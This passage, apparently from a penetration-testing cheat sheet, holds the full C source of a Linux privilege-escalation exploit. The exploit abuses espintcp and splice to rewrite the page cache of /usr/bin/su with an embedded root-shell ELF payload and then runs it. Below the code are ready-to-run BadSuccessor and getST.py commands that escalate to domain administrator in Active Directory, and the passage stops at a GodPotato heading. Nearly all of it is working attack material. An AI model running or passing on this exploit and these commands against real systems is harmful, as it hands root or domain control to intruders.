	unsigned int count = 0, nonce;
	int alg_fd;

	alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;

		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count != 256) {
		fprintf(stderr, "failed to build complete stream-byte table: %u/256\n",
			count);
		exit(2);
	}
	printf("stream0_table_entries=256\n");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];

	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
	printf("byte_flip_nonce=%u stream_byte=%02x\n", nonce, need_stream);
	print_hex_bytes("byte_flip_packet_iv", active_esp_gcm_iv,
			sizeof(active_esp_gcm_iv));
}

static uint64_t parse_u64_arg(const char *s, const char *name)
{
	char *end = NULL;
	unsigned long long v;

	if (s[0] == '-') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, s);
		exit(2);
	}
	return (uint64_t)v;
}

static int hex_nibble(int c)
{
	if (c >= '0' && c <= '9')
		return c - '0';
	if (c >= 'a' && c <= 'f')
		return 10 + c - 'a';
	if (c >= 'A' && c <= 'F')
		return 10 + c - 'A';
	return -1;
}

static bool is_hex_separator(int c)
{
	return c == ':' || c == ',' || c == '-' || c == '_' ||
	       c == ' ' || c == '\t' || c == '\n' || c == '\r';
}

static unsigned char *parse_hex_bytes_arg(const char *s, size_t *len_out)
{
	size_t cap = strlen(s) / 2 + 1, len = 0;
	unsigned char *buf;
	int hi = -1, v;

	buf = malloc(cap);
	if (!buf)
		die("malloc desired bytes");

	for (; *s; s++) {
		if (is_hex_separator((unsigned char)*s))
			continue;
		if (hi < 0 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
			s++;
			continue;
		}

		v = hex_nibble((unsigned char)*s);
		if (v < 0) {
			fprintf(stderr, "invalid hex byte string near '%c'\n", *s);
			exit(2);
		}
		if (hi < 0) {
			hi = v;
			continue;
		}
		buf[len++] = (unsigned char)((hi << 4) | v);
		hi = -1;
	}

	if (hi >= 0) {
		fprintf(stderr, "hex byte string has an odd number of nibbles\n");
		exit(2);
	}
	if (len == 0) {
		fprintf(stderr, "hex byte string is empty\n");
		exit(2);
	}

	*len_out = len;
	return buf;
}

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ret = pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret != 1) {
		fprintf(stderr, "short pread at offset=%llu\n",
			(unsigned long long)off);
		exit(2);
	}
	close(fd);
	return b;
}

static void print_file_sample(const char *label, uint64_t off, size_t len)
{
	unsigned char buf[32];
	ssize_t ret;
	int fd;

	if (len > sizeof(buf))
		len = sizeof(buf);
	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open sample");
	ret = pread(fd, buf, len, (off_t)off);
	if (ret < 0)
		die("pread sample");
	close(fd);
	if ((size_t)ret != len) {
		fprintf(stderr, "short sample at offset=%llu len=%zu got=%zd\n",
			(unsigned long long)off, len, ret);
		exit(2);
	}
	print_hex_bytes(label, buf, len);
}

static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;

	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target is too small: size=%lld need>=%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=
	    (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path is too long\n");
		exit(2);
	}

	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

static void verify_write_denied(const char *label)
{
	int fd;

	errno = 0;
	fd = open(target_file, O_WRONLY | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		printf("namespace_gate_failed: %s write-open unexpectedly succeeded\n",
		       label);
		exit(4);
	}

	printf("%s_write_open_denied=1 errno=%d (%s)\n",
	       label, errno, strerror(errno));
}

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd, saved_errno;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		saved_errno = errno;
		close(fd);
		errno = saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';

	if (write(fd, &c, 1) != 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];

	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=%d (%s)\n",
		       path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child = fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);

		sync_read_byte(ready_pipe[0]);

		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);

		sync_write_byte(mapped_pipe[1]);

		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			fprintf(stderr, "userns child killed by signal %d\n",
				WTERMSIG(status));
			exit(2);
		}
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");

	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");

	printf("userns_setup: outer_uid=%u outer_gid=%u ns_uid=%d ns_gid=%d\n",
	       outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);

	printf("loopback_up=1\n");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}

	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;

	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR)
			continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0)
			return 0;
		errno = -err->error;
		return -1;
	}

	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = {
		.nl_family = AF_NETLINK,
	};
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1)
		die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa,
		     sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) {
		errno = EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}

	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);

	printf("xfrm_espintcp_state_add=1\n");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();

	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");

	printf("netns_setup=1\n");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	printf("namespace_setup_complete=1\n");
}

static void write_ready(int fd)
{
	char c = 'R';

	if (write(fd, &c, 1) != 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");

	printf("receiver_ns_uid=%d euid=%d espintcp_enabled_after_queue=1\n",
	       getuid(), geteuid());
	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00;
	prefix.esp[1] = 0x00;
	prefix.esp[2] = 0x01;
	prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off = target_splice_off;
	start_off = off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN)
		die("sender splice file to pipe");

	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	printf("sender_ns_uid=%d euid=%d prefix_send=%zd splice_to_tcp=%zd file_off=%lld file_off_next=%lld\n",
	       getuid(), geteuid(), sent, ret, (long long)start_off,
	       (long long)off);

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx = fork();
	if (rx < 0)
		die("fork receiver");
	if (rx == 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx = fork();
	if (tx < 0)
		die("fork sender");
	if (tx == 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	printf("sender_status=%d receiver_status=%d\n", st_tx, st_rx);
	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n = (uint64_t)byte_len;

	if (n == 0) {
		fprintf(stderr, "byte range is empty\n");
		exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		fprintf(stderr, "byte range overflows uint64_t\n");
		exit(2);
	}
	return byte_off + n - 1;
}

static void draw_smash_frame(const unsigned char *desired, size_t desired_len,
			     const unsigned char *live, size_t idx_current,
			     size_t changed, size_t skipped, int first_draw)
{
	size_t done   = changed + skipped;
	size_t filled = desired_len ? done * FRAME_BAR_W / desired_len : FRAME_BAR_W;
	size_t row, col, bi, i;

	/* Save cursor, jump to row 1, buffer the whole frame into one write. */
	static char frame_buf[8192];
	setvbuf(stdout, frame_buf, _IOFBF, sizeof(frame_buf));
	if (!first_draw)
		printf("\033[s\033[?25l\033[1;1H");

	/* ── header ─────────────────────────────────────────────────── */
	printf("\r\033[2K" C_BCYN "[*]" C_RESET
	       " smashing %zu bytes into read-only page cache"
	       "  changed=" C_BGRN "%zu" C_RESET
	       "  skipped=" C_DIM "%zu" C_RESET
	       "  remaining=" C_BYLW "%zu" C_RESET "\n",
	       desired_len, changed, skipped,
	       done < desired_len ? desired_len - done : (size_t)0);

	/* ── hex dump ────────────────────────────────────────────────── */
	for (row = 0; row < FRAME_PAYLOAD_ROWS; row++) {
		/* col-0 highlight borrows the header's last trailing space */
		int col0_hi = (idx_current < desired_len &&
			       row * 16 == idx_current);
		printf("\r\033[2K" C_DIM "  %04zx%s" C_RESET,
		       row * 16, col0_hi ? " " : "  ");

		for (col = 0; col < 16; col++) {
			bi = row * 16 + col;
			int cur = (idx_current < desired_len && bi == idx_current);

			if (col == 8) {
				/* mid-gap space becomes '[' when col 8 is current */
				printf(cur ? "[" : " ");
				if (cur) {
					printf(C_BYLW "%02x]" C_RESET, live[bi]);
					continue;
				}
			}

			if (bi >= desired_len) { printf("   "); continue; }

			if (bi < idx_current) {
				printf(live[bi] == desired[bi]
				       ? C_BGRN "%02x " C_RESET
				       : C_BRED "%02x " C_RESET, live[bi]);
			} else if (cur) {
				/* col 0: '[' was the header's borrowed space
				 * col 1-7, 9-15: '\b' eats the preceding byte's space */
				printf(col == 0
				       ? C_BYLW "[%02x]" C_RESET
				       : "\b" C_BYLW "[%02x]" C_RESET, live[bi]);
			} else {
				printf(C_DIM "%02x " C_RESET, desired[bi]);
			}
		}
		printf("\n");
	}

	/* ── progress bar ────────────────────────────────────────────── */
	printf("\r\033[2K  [" C_BGRN);
	for (i = 0; i < filled; i++)          printf("=");
	printf(C_RESET C_DIM);
	for (i = filled; i < FRAME_BAR_W; i++) printf("-");
	printf(C_RESET "] " C_BWHT "%zu" C_RESET "/" C_DIM "%zu" C_RESET " (%zu%%)\n",
	       done, desired_len,
	       desired_len ? done * 100 / desired_len : (size_t)100);

	/* ── separator ───────────────────────────────────────────────── */
	printf("\r\033[2K" C_DIM
	       "────────────────────────────────────────────────────────────"
	       C_RESET "\n");

	fflush(stdout);
	setvbuf(stdout, NULL, _IONBF, 0);
	if (!first_draw)
		printf("\033[?25h\033[u");  /* restore cursor to log area */
}

static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len,
					uint64_t file_size)
{
	uint64_t last = checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed = 0, skipped = 0;
	unsigned char live_state[PAYLOAD_LEN];
	int fd_init;

	if (last >= file_size) {
		fprintf(stderr, "byte range outside target: offset=%llu len=%zu size=%llu\n",
			(unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}
	if (last > file_size - FRAG_LEN) {
		fprintf(stderr,
			"collateral-after mode requires requested range end <= size-%d: offset=%llu len=%zu size=%llu\n",
			FRAG_LEN, (unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}

	printf(C_BCYN "\n[*]" C_RESET
	       " timing: rx_pre_ulp=%uus tx_pre_splice=%uus rx_post_ulp=%uus\n",
	       RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
	printf(C_BCYN "[*]" C_RESET
	       " range: offset=0x%llx len=%zu last=0x%llx"
	       " enc_len=%d splice_len=%d\n",
	       (unsigned long long)byte_off, desired_len,
	       (unsigned long long)last, ESP_GCM_ENCRYPTED_LEN, FRAG_LEN);
	printf(C_BCYN "[*]" C_RESET
	       " union: transformed=0x%llx-0x%llx"
	       " collateral_after=0x%llx-0x%llx\n",
	       (unsigned long long)byte_off,
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1),
	       (unsigned long long)(last + 1),
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1));
	printf(C_BCYN "[*]" C_RESET " ");
	print_hex_bytes("payload", desired, desired_len);
	printf("\n");

	build_stream0_table();
	printf("\n");

	/* seed live_state from the file so the hex dump has real values */
	fd_init = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd_init < 0) die("open live_state init");
	if (pread(fd_init, live_state, desired_len, (off_t)byte_off) < (ssize_t)desired_len)
		die("pread live_state init");
	close(fd_init);

	/* clear screen so the frame starts at a known row 1 */
	printf("\033[2J\033[H");
	draw_smash_frame(desired, desired_len, live_state, 0, 0, 0, 1);

	/* pin the frame to rows 1-FRAME_LINES; scroll region below */
	{
		struct winsize ws;
		int tr = 40;
		if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) == 0 && ws.ws_row > FRAME_LINES)
			tr = (int)ws.ws_row;
		printf("\033[%d;%dr", FRAME_LINES + 1, tr);
		printf("\033[%d;1H", tr);  /* park cursor at bottom of scroll region */
		fflush(stdout);
	}

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current, final, need_stream;

		live_state[idx] = read_byte_at(target_file, off);
		current = live_state[idx];

		draw_smash_frame(desired, desired_len, live_state, idx,
				 changed, skipped, 0);

		if (current == desired[idx]) {
			printf(C_DIM "[-] [%zu/%zu] +%04llx already=%02x skip\n" C_RESET,
			       idx + 1, desired_len, (unsigned long long)off, current);
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		printf(C_BCYN "[*]" C_RESET " [%zu/%zu]"
		       " +%04llx  " C_RED "%02x" C_RESET " -> " C_BGRN "%02x" C_RESET
		       "  xor=" C_CYAN "%02x" C_RESET
		       " seq=" C_DIM "%u" C_RESET
		       " nonce=" C_DIM "%u" C_RESET "\n",
		       idx + 1, desired_len, (unsigned long long)off,
		       current, desired[idx], need_stream,
		       active_esp_seq, stream0_nonce[need_stream]);

/*
		printf(C_BCYN "[*]" C_RESET " before:\n");
		print_hex_row(target_file, off, "orig", current, "want", desired[idx]);

		printf(C_BCYN "[*]" C_RESET " iv=" C_CYAN);
		{
			size_t k;
			for (k = 0; k < sizeof(active_esp_gcm_iv); k++)
				printf("%02x", active_esp_gcm_iv[k]);
		}
*/
		printf(C_RESET " firing espintcp splice...\n");

		if (run_trigger_pair() < 0) {
			fprintf(stderr, C_BRED "[-] trigger pair failed at index=%zu\n" C_RESET, idx);
			return 2;
		}

		final = read_byte_at(target_file, off);
		live_state[idx] = final;

/*
		printf(C_BCYN "[*]" C_RESET " after:\n");
		print_hex_row(target_file, off, "was", current, "now", final);
*/
		if (final == desired[idx]) {
			printf(C_BGRN "[+]" C_RESET " smashed"
			       C_DIM " %02x -> %02x  index=%zu offset=+%04llx\n\n" C_RESET,
			       current, final, idx, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final == current) {
			printf(C_BGRN "[-]" C_RESET
			       " fixed behavior: byte unchanged at index=%zu offset=%llu\n",
			       idx, (unsigned long long)off);
			return 0;
		}
		printf(C_BRED "[-]" C_RESET
		       " BUG: byte changed but desired-value check mismatched"
		       " index=%zu offset=%llu desired=%02x got=%02x\n",
		       idx, (unsigned long long)off, desired[idx], final);
		return 1;
	}

	/* final frame: all bytes done, cursor past the end */
	draw_smash_frame(desired, desired_len, live_state, desired_len,
			 changed, skipped, 0);

	/* restore full scroll region and drop cursor below the frame */
	printf("\033[r\033[%d;1H\n", FRAME_LINES + 1);

	/* final verify pass */
	printf(C_BCYN "[*]" C_RESET " verifying %zu bytes...\n", desired_len);
	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char final = read_byte_at(target_file, off);

		if (final != desired[idx]) {
			printf(C_BRED "[-]" C_RESET
			       " BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x\n",
			       idx, (unsigned long long)off, desired[idx], final);
			return 1;
		}
	}

	printf(C_BCYN "[*]" C_RESET " bytes_flip_summary len=%zu changed=" C_BGRN "%zu" C_RESET
	       " skipped=" C_DIM "%zu" C_RESET "\n",
	       desired_len, changed, skipped);
	if (changed == 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}

	printf(C_BGRN "[+]" C_RESET " BUG: changed requested copied byte range to desired values\n");
	return 1;
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s <target-file> <offset> <hex-bytes>\n", prog);
	fprintf(stderr, "example: %s /path/to/target 0 42434445\n", prog);
}

static const uint8_t shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

int main(int argc, char **argv)
{
	unsigned char *desired;
	uint64_t file_size, byte_off;
	size_t desired_len, sample_len;
	int ret;


	setvbuf(stdout, NULL, _IONBF, 0);

	printf(C_BCYN "[*]" C_RESET
	       " uid=" C_BWHT "%d" C_RESET
	       " euid=" C_BWHT "%d" C_RESET
	       " gid=" C_BWHT "%d" C_RESET
	       " egid=" C_BWHT "%d" C_RESET "\n",
	       getuid(), geteuid(), getgid(), getegid());
	printf(C_BCYN "[*]" C_RESET
	       " mode=xfrm_espintcp_pagecache_replace collateral=after\n");
	printf("\n");

//        system("cp /bin/cat /tmp/test");
//        file_size = use_existing_target("/tmp/test");
        file_size = use_existing_target("/usr/bin/su");
	byte_off = 0;
	desired = (unsigned char *)shell_elf;
	desired_len = PAYLOAD_LEN;

	printf(C_BCYN "[*]" C_RESET " target=%s size=%llu\n",
	       target_file, (unsigned long long)file_size);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns_root_mapped_to_outer_user");

	ret = replace_existing_bytes_after(byte_off, desired, desired_len,
					   file_size);
	/* reset scroll region; some terminals home the cursor on \033[r so
	 * explicitly jump to the last row so PS1 lands below our output */
	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
	execve("/usr/bin/su", NULL, NULL);
	return ret;
}
```

#### BadSuccessor Delegated Managed Service Account (dMSA) LPE

> https://github.com/ibaiC/BadSuccessor

```cmd
.\BadSuccessor.exe find
```

```cmd
.\BadSuccessor.exe escalate -targetOU "OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>" -dmsa evildmsa -targetUser "CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" -dnshostname evildmsa -user <USERNAME> -dc-ip <RHOST>
```

```shell
python3 getST.py <DOMAIN>/<USERNAME> -dc-ip <RHOST> -self -dmsa -impersonate evildmsa$ -k -no-pass
```

#### GodPotato LPE

> https://github.com/BeichenDream/GodPotato

```cmd
